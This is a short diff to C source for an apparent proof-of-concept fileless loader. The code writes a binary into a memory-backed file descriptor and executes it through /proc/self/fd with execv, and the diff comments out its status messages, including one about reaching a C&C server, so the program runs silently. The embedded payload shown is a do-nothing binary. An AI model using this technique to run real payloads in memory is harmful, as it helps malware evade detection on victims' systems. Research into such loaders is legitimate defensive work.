@@ -78,14 +78,14 @@ void write_data (void *ptr, size_t size, int shm_fd) {
                 close(shm_fd);
                 exit(-1);
         }
-        fprintf(stderr, "[+] File written!\n");
+        //fprintf(stderr, "[+] File written!\n");
 }
 
 // Load the shared object
 void load_so(int shm_fd) {
         char path[1024];
 
-        fprintf(stderr, "[+] Trying to load Shared Object!\n");
+        //fprintf(stderr, "[+] Trying to load Shared Object!\n");
         snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
         char *argv[] = {path, (char *)NULL};
         execv(path, argv); // replace the curr
@@ -122,9 +122,9 @@ int main (int argc, char **argv) {
         char flags_json[256];
         int shm_fd;
 
-        fprintf(stderr, "PID of the PoC is: %d\n", getpid());
+        //fprintf(stderr, "PID of the PoC is: %d\n", getpid());
 
-        fprintf(stderr, "[+] Trying to reach C&C & start download...\n");
+        //fprintf(stderr, "[+] Trying to reach C&C & start download...\n");
         shm_fd = open_ramfs(); // Give me a file descriptor to memory
         write_data(binary_that_does_nothing, binary_that_does_nothing_len, shm_fd); // do_nothing.c binary
 
